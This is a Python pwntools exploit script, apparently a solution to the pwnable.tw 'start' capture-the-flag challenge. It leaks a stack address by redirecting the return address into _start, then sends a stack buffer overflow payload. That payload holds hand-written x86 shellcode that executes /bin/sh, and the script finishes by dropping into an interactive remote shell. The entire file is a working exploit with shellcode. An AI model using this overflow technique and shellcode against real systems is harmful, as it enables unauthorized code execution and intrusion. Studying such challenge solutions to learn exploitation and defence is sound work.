from pwn import *


HOST = "chall.pwnable.tw"
PORT = 10000

def leak_stack(conn):
    middle = p32(0x08048087)  # PTR to the middle of the start function.
    conn.send(middle*6)  # Overwrite the return address back into _start.
    stack_addr = u32(conn.recvn(40)[20:24])  # Getting the leaked stack addr.

    return stack_addr + 0x14


def main():
    payload = "\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xB8\x0B\x00\x00\x00\xCD\x80\xB8\xFC\x00\x00\x00\x31\xDB\xCD\x80"
    conn = remote(HOST, PORT)  # The connection to the server.
    stack_addr = leak_stack(conn)  # The leaked stack address.
    log.info("Got stack address: %s" % hex(stack_addr))
    payload = p32(stack_addr)*6 + payload

    conn.send(payload)  # Bombs away!
    conn.interactive()


if __name__ == "__main__":
    main()

